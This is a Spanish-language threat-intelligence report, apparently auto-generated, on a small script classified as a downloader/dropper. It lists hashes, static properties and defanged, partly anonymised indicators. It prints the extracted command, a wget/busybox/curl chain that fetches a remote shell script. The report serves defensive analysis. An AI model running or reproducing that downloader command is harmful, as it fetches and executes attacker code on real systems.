# 🧬 Payload Analysis

`a84e3cc23877f5d8e92f8133eea8d7a2a6e62802e8a350945eb2c09d1fe68932`

## 📌 Resumen

Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Ejecución. Se asoció 1 comando observado o extraído.

## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:45:45+00:00`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `a84e3cc23877f5d8e92f8133eea8d7a2a6e62802e8a350945eb2c09d1fe68932`
- **MD5:** `5fea9b013d866f08ed4f84681e0ab625`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 469 B |
| Entropía | 5.29 |
| Strings | 8 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=5

## 🖥️ Comandos observados / extraídos

```text
(wget -qO- hxxp://45.153.34.XXX/rondo.``dgx.sh||busybox wget -qO- hxxp://45.153.34.XXX/rondo.``dgx.sh||curl -s hxxp://45
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 190.179.168.XXX | static_analysis |
| ip | 45.153.34.XXX | static_analysis |
| url | hxxp://45.153.34.XXX/rondo. | strings |
| hash | a84e3cc23877f5d8e92f8133eea8d7a2a6e62802e8a350945eb2c09d1fe68932 | static_analysis |
| command | (wget -qO- hxxp://45.153.34.XXX/rondo.``dgx.sh\|\|busybox wget -qO- hxxp://45.153.34.XXX/rondo.``dgx.sh\|\|curl -s hxxp://45 | strings |
| ip | 94.154.43.XXX | artifact_source |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
